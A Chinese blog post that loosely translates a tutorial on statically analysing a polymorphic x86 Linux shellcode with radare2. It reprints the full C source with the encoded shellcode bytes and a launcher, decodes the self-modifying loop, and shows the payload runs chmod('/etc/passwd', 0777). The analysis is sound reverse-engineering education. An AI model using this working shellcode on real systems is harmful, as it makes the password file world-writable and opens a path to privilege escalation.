---
layout: post
title: "Radare2小试: 简单shellcode分析(意译)"
excerpt: "radare2小试，翻译代笔记"
category: exploit
tags: [reverse-engineer]
disqus: true
---


意译自： [Adventures with Radare2 #1: A Simple Shellcode Analysis](http://canthack.org/2011/07/adventures-with-radare-1-a-simple-shellcode-analysis/)

有个同学最近在学汇编。把我逆向的热情又拉起来了。下午看到个比较有意思又能看懂的文章，胡乱意译，可以当作我个人的一个笔记。有什么想法可以留言讨论。

以下是正文

---

[Radare2](http://radare.org/)——一个开源逆向工程工具箱，包含反汇编器、调试器和十六进制编辑器。本文将它嗯过逆向在[Project Shellcode](http://www.projectshellcode.com)上找到的shellcode来展示其基础用法。

## Shellcode

我们先谈谈啥叫`Shellcode`，别想成shell脚本了。`shellcode`之用来挖掘漏洞的有效载荷。其中的典型就是注入一段启动shell的代码。

Project Shellcode是一个shellcode及其源码仓库。我通过[reddit.com/r/reverseengineering](http://reddit.com/r/reverseengineering)在上月找到的。让我们看看其中一个例子。

## 60字节的chmod 777多态x86 Linux Shellcode

我碰巧先看到[这个](http://www.projectshellcode.com/?q=node/289).

    /*
    1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
    0     _                   __           __       __                     1
    1   /' \            __  /'__`\        /\ \__  /'__`\                   0
    0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
    1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
    0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
    1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
    0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
    1                  \ \____/ >> Exploit database separated by exploit   0
    0                   \/___/          type (local, remote, DoS, etc.)    1
    1                                                                      1
    0  [+] Site            : Inj3ct0r.com                                  0
    1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
    0                                                                      0
    0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
    Name   : 60 bytes chmod 777 polymorphic x86 linux shellcode
    Date   : Sat Jun  5 16:10:00 2010
    Author : gunslinger_ 
    Web    : http://devilzc0de.org
    blog   : http://gunslingerc0de.wordpress.com
    tested on : linux debian
    special thanks to : r0073r (inj3ct0r.com), d3hydr8 (darkc0de.com),
    ty miller (projectshellcode.com), jonathan salwan(shell-storm.org),
    mywisdom (devilzc0de.org), loneferret (offensive-security.com)
    */
    
    /*
    root@localhost# ls -la /etc/passwd
    -rw-r--r-- 1 root root 1869 2010-05-08 15:53 /etc/passwd
    root@localhost# gcc -o polymorphic_chmod polymorphic_chmod.c
    chmod.c: In function ‘main’:
    chmod.c:37: warning: incompatible implicit declaration of built-in function ‘strlen’
    root@localhost# ./polymorphic_chmod
    Length: 64
    root@localhost# ls -la /etc/passwd
    -rwxrwxrwx 1 root root 1869 2010-05-08 15:53 /etc/passwd
    root@localhost# chmod 644 /etc/passwd
    root@localhost# ls -la /etc/passwd
    -rw-r--r-- 1 root root 1869 2010-05-08 15:53 /etc/passwd
    */
    
    #include <stdio.h>
    #include <string.h>
    
    char shellcode[] =
    	"\xeb\x11\x5e\x31\xc9\xb1\x27\x80\x6c\x0e\xff\x35\x80\xe9\x01"
    	"\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x20\x4a\x66\xf5\xe5\x44"
    	"\x90\x66\xfe\x9b\xee\x34\x36\x02\xb5\x66\xf5\xe5\x36\x66\x10"
    	"\x02\xb5\x1d\x1b\x34\x34\x34\x64\x9a\xa9\x98\x64\xa5\x96\xa8"
    	"\xa8\xac\x99";
    
    int main(void)
    {
    	fprintf(stdout,"Length: %zu\n",strlen(shellcode));
    	(*(void(*)()) shellcode)();
         
    return 0;
    }

评论中的描述声称代码在`/etc/passwd`中设置文件权限为`777`，但是你乍一看肯定看不出来。我们只能看到一个初始化为16进制的字节数组。接着被投射给函数指针然后调用。

## 实用Radare2分析

我们如何弄清程序做了什么？我们可以构建并且运行它，但我不会。因为它可能移除我的家目录。我们实用radare2静态检测它。

首先构建二进制文件

    ~/Work/project/reverse ⮀ cc -o shellcode polymorphic_chmod_etc_passwd_777.c

接着载入到radare2中：

     ~/Work/project/reverse ⮀ r2 ./shellcode 
     -- In soviet Afghanistan you debug radare2!
    [0x00400520]> 

我们没有加`-d`参数，这样可以以静态分析模式运行，而不是实用radare2内建的调试器。现在radare已经就绪，让我们开始输入命令。

radare2的命令通常都非常短。键入`?`回车就会进入帮助概述。若问号后面跟着命令，就会给出命令使用的详细信息。

我们首先得定位字节字符串。因为二进制文件没有被精简(stripped)，有幸保留了`main`函数的虚拟地址。Radare2使用`flags`的概念标记二进制文件中的有用位置。尝试键入`f`来得到标记列表。main函数将被标记为`sym.main`。

我们使用`pd`命令反汇编：

    [0x080483a0]> pd@sym.main 
                ;-- sym.main:
                0x0804849c    55           push ebp                                     
                0x0804849d    89e5         mov ebp, esp
                0x0804849f    83e4f0       and esp, 0xfffffff0
                0x080484a2    83ec10       sub esp, 0x10
                0x080484a5    c7042440a00. mov dword [esp], sym.shellcode ;  0x0804a040 
                0x080484ac    e8bffeffff   call sym.imp.strlen
                   0x08048370(unk) ; sym.imp.strlen
                0x080484b1    8b1580a00408 mov edx, [sym.__TMC_END__]
                0x080484b7    89442408     mov [esp+0x8], eax

`pd`命令将反汇编等于`block size`的代码块(参见`b`命令)，本例中块大小似乎比main函数大很多。我们知道gcc生成结构非常好的函数，我们让radare2来分析这个函数并完整打印：

    [0x080483a0]> af@sym.main 
    [0x080483a0]> pdf@sym.main
               ; DATA XREF from 0x080483b7 (fcn.08048396)
    / (fcn) sym.main 61
    |          0x0804849c    55           push ebp
    |          0x0804849d    89e5         mov ebp, esp
    |          0x0804849f    83e4f0       and esp, 0xfffffff0
    |          0x080484a2    83ec10       sub esp, 0x10
    |          0x080484a5    c7042440a00. mov dword [esp], sym.shellcode ;  0x0804a040 
    |          0x080484ac    e8bffeffff   call sym.imp.strlen
    |             sym.imp.strlen(unk)
    |          0x080484b1    8b1580a00408 mov edx, [sym.__TMC_END__]
    |          0x080484b7    89442408     mov [esp+0x8], eax
    |          0x080484bb    c7442404708. mov dword [esp+0x4], str.Length___zu_n ;  0x08048570 
    |          0x080484c3    891424       mov [esp], edx
    |          0x080484c6    e8c5feffff   call sym.imp.fprintf
    |             sym.imp.fprintf()
    |          0x080484cb    b840a00408   mov eax, sym.shellcode ;  0x0804a040 
    |          0x080484d0    ffd0         call eax
    |             0x00000000() ; section..comment
    |          0x080484d2    b800000000   mov eax, 0x0
    |          0x080484d7    c9           leave
    \          0x080484d8    c3           ret

打眼一看就知道需要什么知道什么了。在二进制文件中有足够的信息来帮助标记挖掘漏洞的shellcode字符串位置。你可以在符号名后头看到实际地址。

这个程序对载荷做了什么？可以看到`strlen()`和`fprintf()`
的调用。但更重要的，shellcode的地址在被调用前载入eax寄存器(在`0x080484cb`载入，于`0x080484d0`调用)。显然下一步就是检查有效载荷看看它做了什么：

    [0x080483a0]> pD 60@sym.shellcode
    |      ,  ; DATA XREF from 0x080484a2 (sym.main)
    |      ,  ; DATA XREF from 0x080484c8 (sym.main)
           ,  ;-- sym.shellcode:
           ,=< 0x0804a040    eb11         jmp 0x804a053
           |   ;-- str._1___:
           |   0x0804a042     .string "^1ɱ'" ; len=6
          ||   0x0804a048    6c           insb
          ||   0x0804a049    0e           push cs
          ||   0x0804a04a    ff3580e90175 push dword [0x7501e980]
           |   0x0804a050    f6eb         imul bl
         | |   0x0804a052    05e8eaffff   add eax, 0xffffeae8
         |     0x0804a057    ff20         jmp dword [eax]
               0x0804a059    4a           dec edx
               0x0804a05a    66f5         o16 cmc
               0x0804a05c    e544         in eax, 0x44
               0x0804a05e    90           nop
               0x0804a05f    66fe9b       invalid
               0x0804a062    ee           out dx, al
               0x0804a063    3436         xor al, 0x36
               0x0804a065    02b566f5e536 add dh, [ebp+0x36e5f566]
               0x0804a06b    661002       o16 adc [edx], al
               0x0804a06e    b51d         mov ch, 0x1d ;  0x0000001d 
               ;-- str._e444d:
               0x0804a070     .string "\\e444d" ; len=6
               0x0804a076    a99864a596   test eax, 0x96a56498
               0x0804a07b    a8           invalid

这里使用`pD`来指定想要反汇编的字节数(这里是60)。该怎么评论这些呢？乍一看，有些不能执行的东西，有点棘手。

译者：我的radare git-2014-7-26版本显然和2011年作者写这篇文章时变化了很多。为了能够继续下去，使用`pDi`命令：

    [0x080483a0]> pDi 60@sym.shellcode
    0x0804a040              eb11  jmp 0x804a053
    0x0804a042                5e  pop esi
    0x0804a043              31c9  xor ecx, ecx
    0x0804a045              b127  mov cl, 0x27
    0x0804a047        806c0eff35  sub byte [esi+ecx-0x1], 0x35
    0x0804a04c            80e901  sub cl, 0x1
    0x0804a04f              75f6  jne 0x804a047
    0x0804a051              eb05  jmp 0x804a058
    0x0804a053        e8eaffffff  call 0x804a042
    0x0804a058            204a66  and [edx+0x66], cl
    0x0804a05b                f5  cmc
    0x0804a05c              e544  in eax, 0x44
    0x0804a05e                90  nop
    0x0804a05f                66  invalid
    0x0804a062                ee  out dx, al
    0x0804a063              3436  xor al, 0x36
    0x0804a065      02b566f5e536  add dh, [ebp+0x36e5f566]
    0x0804a06b            661002  o16 adc [edx], al
    0x0804a06e              b51d  mov ch, 0x1d
    0x0804a070            1b3434  sbb esi, [esp+esi]
    0x0804a073              3464  xor al, 0x64
    0x0804a075    9aa99864a596a8  call dword 0xa896:0xa56498a9
    0x0804a07c              a8ac  test al, 0xac
    0x0804a07e                99  cdq
    0x0804a07f            004743  add [edi+0x43], al
    0x0804a082                43  inc ebx
    0x0804a083              3a20  cmp ah, [eax]
    0x0804a085            284765  sub [edi+0x65], al
    0x0804a088                6e  outsb
    0x0804a089              746f  je 0x804a0fa
    0x0804a08b                6f  outsd
    0x0804a08c            20342e  and [esi+ebp], dh
    0x0804a08f                37  aaa
    0x0804a090    2e332d72312070  xor ebp, [cs:0x70203172]
    0x0804a097              312e  xor [esi], ebp
    0x0804a099            332c20  xor ebp, [eax]
    0x0804a09c              7069  jo 0x804a107
    0x0804a09e      652d302e352e  sub eax, 0x2e352e30
    0x0804a0a4        352920342e  xor eax, 0x2e342029
    0x0804a0a9                37  aaa
    0x0804a0aa            2e3300  xor eax, [cs:eax]
    0x0804a0ad              1c00  sbb al, 0x0
    0x0804a0af              0000  add [eax], al
    0x0804a0b1              0200  add al, [eax]
    0x0804a0b3              0000  add [eax], al
    0x0804a0b5              0000  add [eax], al
    0x0804a0b7              0400  add al, 0x0
    0x0804a0b9              0000  add [eax], al
    0x0804a0bb              0000  add [eax], al
    0x0804a0bd                9c  pushfd
    0x0804a0be            840408  test [eax+ecx], al
    0x0804a0c1              3a00  cmp al, [eax]
    0x0804a0c3              0000  add [eax], al
    0x0804a0c5              0000  add [eax], al
    0x0804a0c7              0000  add [eax], al
    0x0804a0c9              0000  add [eax], al
    0x0804a0cb              0000  add [eax], al
    0x0804a0cd                1e  push ds
    0x0804a0ce              0300  add eax, [eax]
    0x0804a0d0              0002  add [edx], al

现在开始在心中模拟执行。首先跳到`0x804a053`，在那里调用`0x804a042`，就是第一个指令后面的一个指令。

看上去啥也没干似的。但是，`call`调用将调用的返回地址推入栈中，接着存入`esi`中。在32位x86中没法直接获取`eip`，刚才那个过程就是著名的获取eip的一种hack。程序计数器(`eip`)可以用来指向有效载荷相关的数据/代码(记住：攻击者不知道他的代码将被连接器分配到何处)。

现在执行到`0x0804a043`，`esi`中的值是`0x0804a058`。这个异或指令在把`0x27`载入`ecx`前将其置零。

`0x0804a047`开始将`[esi+ecx-0x1]`地址的内容减`0x35`
`0x3c00104c`将`ecx`减1
`0x3c00104f`如果`ecx`不为零循环到`0x0804a047`

`ecx`是`{0x27, 0x26,...,0x1}`，`esi`已知。所以通过计算，需要将从`0x0804a058`开始的`0x27`字节减去`0x35`。为了模拟这个自修改代码的效果。可以使用`wo`系列命令。查看相关帮助：

    [0x080483a0]> wo?
    |Usage: wo[asmdxoArl24] [hexpairs] @ addr[:bsize]
    |Example:
    |  wox 0x90   ; xor cur block with 0x90
    |  wox 90     ; xor cur block with 0x90
    |  wox 0x0203 ; xor cur block with 0203
    |  woa 02 03  ; add [0203][0203][...] to curblk
    |  woe 02 03  
    |Supported operations:
    |  wow  ==  write looped value (alias for 'wb')
    |  woa  +=  addition
    |  wos  -=  substraction
    |  wom  *=  multiply
    |  wod  /=  divide
    |  wox  ^=  xor
    |  woo  |=  or
    |  woA  &=  and
    |  woR  random bytes (alias for 'wr $b'
    |  wor  >>= shift right
    |  wol  <<= shift left
    |  wo2  2=  2 byte endian swap
    |  wo4  4=  4 byte endian swap

使用`wos`从一段内存地址中减去一个常量。但首先要打开输入输出缓存(io cache)。默认情况下radare2以只读方式打开文件，除非以`-w`标志打开。或者，设置`io.cache`为`true`，在内润中缓存写入内容。用户可随意撤销或者提交这些写入，暂不用讨论这些细节。

    [0x080483a0]> e io.cache=true
    [0x080483a0]> wos 0x35@0x0804a058:0x27
    [0x080483a0]> pDi 30@sym.shellcode 
    0x0804a040              eb11  jmp 0x804a053
    0x0804a042                5e  pop esi
    0x0804a043              31c9  xor ecx, ecx
    0x0804a045              b127  mov cl, 0x27
    0x0804a047        806c0eff35  sub byte [esi+ecx-0x1], 0x35
    0x0804a04c            80e901  sub cl, 0x1
    0x0804a04f              75f6  jne 0x804a047
    0x0804a051              eb05  jmp 0x804a058
    0x0804a053        e8eaffffff  call 0x804a042
    0x0804a058              eb15  jmp 0x804a06f
    0x0804a05a              31c0  xor eax, eax
    0x0804a05c              b00f  mov al, 0xf
    0x0804a05e                5b  pop ebx
    0x0804a05f              31c9  xor ecx, ecx
    0x0804a061          66b9ff01  mov cx, 0x1ff
    0x0804a065              cd80  int 0x80
    0x0804a067              31c0  xor eax, eax
    0x0804a069              b001  mov al, 0x1
    0x0804a06b              31db  xor ebx, ebx
    0x0804a06d              cd80  int 0x80
    0x0804a06f        e8e6ffffff  call 0x804a05a
    0x0804a074                2f  das
    0x0804a075            657463  je 0x804a0db
    0x0804a078                2f  das
    0x0804a079              7061  jo 0x804a0dc
    0x0804a07b              7373  jae 0x804a0f0
    0x0804a07d              7764  ja 0x804a0e3
    0x0804a07f                cb  retf
    0x0804a080              120e  adc cl, [esi]
    0x0804a082                0e  push cs

看到`0x0804a058`之后的指令开始有效。我先看到个`int 0x80`指令。在UNIX类系统中，`0x80`终端有特殊含义：要求内核执行系统调用，系统调用号储存在`eax`中。

通过人工执行(通过跳转和调用)，可得`eax`在`0x0804a065`是`0xf`，在`0x0804a06d`是`0x1`。然后google下或者随便参考下x86内核头文件就知道是哪些系统调用了。

可查得在`0x0804a065`调用`chmod`，接着在`0x0804a06d`调用`exit`。接着检查调用参数弄清这些调用做了什么。在linux系统中，调用参数在寄存器中(`ebx`,`ecx`,`edx`, `esi`, `edi`, `ebp`)。

`chmod`有两个参数：分别在`ebx`和`ecx`中有指向文件路径的字符指针和模式(`mode_t`，只是一个指定想要更改成的模式或者权限的整数)。`ebx`在`0x0804a05e`从栈顶弹出，向回溯源看到栈上最顶的东西是`0x0804a06f`调用的返回地址(`0x0804a074`)。当然，这根本不是返回地址，就是一种巧妙的将字符串打包到有效载荷中的方式(shellcode动态寻址)。使用`ps`命令看看它是啥：

    [0x080483a0]> ps@0x0804a074
    /etc/passwd\xcb\x12\x0e\x0e\x05\xeb\xf3\x1209?::\xeb\xff\xf9\x02\xf9\xfe\xf8=\xfc\xeb;\xfc\xf9\xfe\xf7\xeb;40\xf8\xfb\xf9

`chmod`的第二个参数在`ecx`中。值是`0x1ff`，换算成八进制就是`0777`

    (gdb) p/o 0x1ff
    $2 = 0777

所以调用就是`chmod('/etc/passwd', 0777)`

之后仅仅是调用`exit`退出程序。

## 总结评论

这里是一个在运行时动态改变自身来对抗静态分析的shellcode。该技术并不新奇，确是逃避硬编码检测的简单方法。

现代操作系统中这个shellcode不起作用，因为有效载荷在二进制文件的`.data`区，不可写也不可执行…………译者表示这扯远了不管它，通过使用gcc的参数`-fno-stack-protector execstack`等应该可以把这些保护关上，大概吧，记不清楚了。

如果想有点挑战性，试试精简过的(stripped)的二进制文件！

有评论告诉我。

---

以下是译者的题外话：

Recent：

- coursera crypto-11
- statistics for engineers and the sciences
- coursera pred-003, I give up follow this course
- Xie Yihui，现代统计图形
- python for data analysis

Next?: append

- Wikibooks:x86 assembly, http://en.wikibooks.org/wiki/X86_Disassembly
- phrack radare: http://phrack.org/issues/66/14.html
- crackme: http://dustri.org/b/defeating-ioli-with-radare2.html

Future:

The elements of statistical learning?
